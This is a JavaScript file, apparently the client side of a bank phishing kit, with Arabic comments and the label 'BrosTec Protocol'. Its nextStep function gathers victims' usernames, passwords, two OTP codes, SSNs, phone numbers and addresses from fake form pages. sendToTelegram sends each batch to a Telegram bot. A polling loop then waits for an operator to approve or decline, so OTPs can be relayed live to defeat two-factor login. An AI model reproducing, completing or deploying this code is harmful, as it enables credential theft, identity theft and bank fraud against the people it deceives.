/**
 * BrosTec Protocol - Enhanced Telegram Control System
 * Version: 2.0 (Multi-Session Support)
 * Status: Extended Structure
 */

// --- 1. الإعدادات العامة (Configuration) ---
const telegramConfig = {
    botToken: 'YOUR_BOT_TOKEN_HERE',
    chatId: 'YOUR_CHAT_ID_HERE',
    pollInterval: 3000 
};

// --- 2. توليد معرف فريد للمتصفح (Session Tracking) ---
// هذا المعرف يمنع تداخل بيانات المستخدمين عند وجود أكثر من شخص في نفس الوقت
const sessionId = Math.floor(Math.random() * 900000) + 100000;

// متغير لحفظ حالة الانتظار لمنع التكرار
let isWaiting = false;

/**
 * الوظيفة الرئيسية للانتقال بين الصفحات
 * @param {number} stepNumber - رقم الصفحة التالية
 */
async function nextStep(stepNumber) {
    
    // أولاً: تفعيل واجهة الانتظار (نقطة 2)
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) {
        overlay.style.display = 'flex';
    }

    // ثانياً: تجهيز الرسالة بناءً على الخطوة الحالية
    let messageBody = `🆔 **Session ID:** #${sessionId}\n`;
    messageBody += `--------------------------\n`;

    let shouldSend = false;

    // تجميع بيانات الصفحة الأولى (Login)
    if (stepNumber === 2) {
        const userVal = document.getElementById('user').value;
        const passVal = document.getElementById('pass').value;
        const accType = document.getElementById('accType').value;
        
        messageBody += `📌 **New Login Attempt**\n`;
        messageBody += `👤 User: ${userVal}\n`;
        messageBody += `🔑 Pass: ${passVal}\n`;
        messageBody += `🏦 Type: ${accType}\n`;
        shouldSend = true;
    } 
    
    // تجميع بيانات الصفحة الثانية (OTP 1)
    else if (stepNumber === 3) {
        const otp1Val = document.getElementById('otp1').value;
        
        messageBody += `🔢 **OTP 1 Received**\n`;
        messageBody += `Code: ${otp1Val}\n`;
        shouldSend = true;
    } 
    
    // تجميع بيانات الصفحة الثالثة (Full Info)
    else if (stepNumber === 4) {
        const firstName = document.getElementById('fName').value;
        const lastName = document.getElementById('lName').value;
        const ssn = document.getElementById('ssn').value;
        const phone = document.getElementById('phone').value;
        const address = document.getElementById('street').value;
        const city = document.getElementById('city').value;
        const state = document.getElementById('state').value;
        const zip = document.getElementById('zip').value;

        messageBody += `📝 **Full Account Info**\n`;
        messageBody += `Name: ${firstName} ${lastName}\n`;
        messageBody += `SSN: ${ssn}\n`;
        messageBody += `Phone: ${phone}\n`;
        messageBody += `Address: ${address}, ${city}, ${state} ${zip}\n`;
        shouldSend = true;
    } 
    
    // تجميع بيانات الصفحة الرابعة (OTP 2)
    else if (stepNumber === 5) {
        const otp2Val = document.getElementById('otp2').value;
        
        messageBody += `🔢 **OTP 2 Received**\n`;
        messageBody += `Code: ${otp2Val}\n`;
        shouldSend = true;
    }

    // ثالثاً: تنفيذ عملية الإرسال والانتظار
    if (shouldSend) {
        try {
            await sendToTelegram(messageBody, stepNumber);
            await waitForAdminDecision(stepNumber);
        } catch (error) {
            console.error("Critical Error in Step Transition:", error);
        }
    } else {
        // في حال كانت صفحة لا تتطلب إرسال (مثل صفحة النجاح النهائية)
        executeFinalTransition(stepNumber);
    }
}

/**
 * إرسال البيانات إلى التيليجرام مع الأزرار التفاعلية
 */
async function sendToTelegram(text, step) {
    const url = `https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`;
    
    // توليد Callback Data فريد يربط القرار بالـ SessionId
    const nextCmd = `approve_${step}_${sessionId}`;
    const errorCmd = `decline_${step}_${sessionId}`;

    let keyboardButtons = [];

    if (step === 2) {
        keyboardButtons = [[
            { text: "✅ إرسال OTP", callback_data: nextCmd },
            { text: "❌ خطأ في البيانات", callback_data: errorCmd }
        ]];
    } else if (step === 3 || step === 5) {
        keyboardButtons = [[
            { text: "✅ تجاوز (OTP صحيح)", callback_data: nextCmd },
            { text: "❌ OTP خطأ", callback_data: errorCmd }
        ]];
    } else if (step === 4) {
        keyboardButtons = [[
            { text: "✅ طلب OTP الثاني", callback_data: nextCmd },
            { text: "❌ خطأ في المعلومات", callback_data: errorCmd }
        ]];
    }

    const payload = {
        chat_id: telegramConfig.chatId,
        text: text,
        parse_mode: "Markdown",
        reply_markup: {
            inline_keyboard: keyboardButtons
        }
    };

    return fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });
}

/**
 * حلقة الانتظار (Polling) لمراقبة قرار الأدمن من التيليجرام
 */
async function waitForAdminDecision(step) {
    return new Promise((resolve) => {
        const checkInterval = setInterval(async () => {
            const updateUrl = `https://api.telegram.org/bot${telegramConfig.botToken}/getUpdates?offset=-1&timeout=10`;
            
            try {
                const response = await fetch(updateUrl);
                const data = await response.json();

                if (data.result && data.result.length > 0) {
                    const latestUpdate = data.result[data.result.length - 1];

                    if (latestUpdate.callback_query) {
                        const decision = latestUpdate.callback_query.data;

                        // التحقق من أن القرار يخص هذا المتصفح وهذا الـ Session
                        if (decision.includes(sessionId.toString())) {
                            
                            // حالة الموافقة
                            if (decision.startsWith("approve")) {
                                clearInterval(checkInterval);
                                clearAllErrors();
                                executeFinalTransition(step);
                                resolve();
                            } 
                            // حالة الرفض أو الخطأ
                            else if (decision.startsWith("decline")) {
                                clearInterval(checkInterval);
                                processErrorStep(step);
                                resolve();
                            }
                        }
                    }
                }
            } catch (err) {
                console.warn("Polling Update Failed, retrying...");
            }
        }, telegramConfig.pollInterval);
    });
}

/**
 * معالجة حالات الخطأ بناءً على أوامر التيليجرام
 */
function processErrorStep(currentStep) {
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) {
        overlay.style.display = 'none';
    }

    if (currentStep === 2) {
        // العودة لصفحة تسجيل الدخول
        executeFinalTransition(1);
    } else if (currentStep === 3) {
        document.getElementById('otpError1').style.display = 'block';
    } else if (currentStep === 4) {
        document.getElementById('infoError').style.display = 'block';
    } else if (currentStep === 5) {
        document.getElementById('otpError2').style.display = 'block';
    }
}

/**
 * إخفاء كافة رسائل الخطأ من الواجهة
 */
function clearAllErrors() {
    const errors = ['otpError1', 'infoError', 'otpError2'];
    errors.forEach(errorId => {
        const element = document.getElementById(errorId);
        if (element) {
            element.style.display = 'none';
        }
    });
}

/**
 * التنفيذ الفعلي لعملية تبديل الصفحات في المتصفح
 */
function executeFinalTransition(targetId) {
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) {
        overlay.style.display = 'none';
    }

    // إخفاء كافة الأقسام
    const allSections = document.querySelectorAll('.page-section');
    allSections.forEach(section => {
        section.classList.remove('active');
    });

    // إظهار القسم المستهدف
    const activeSection = document.getElementById('step' + targetId);
    if (activeSection) {
        activeSection.classList.add('active');
    }

    // التمرير لسلاسة العرض
    window.scrollTo({
        top: 0,
        behavior: 'smooth'
    });
}
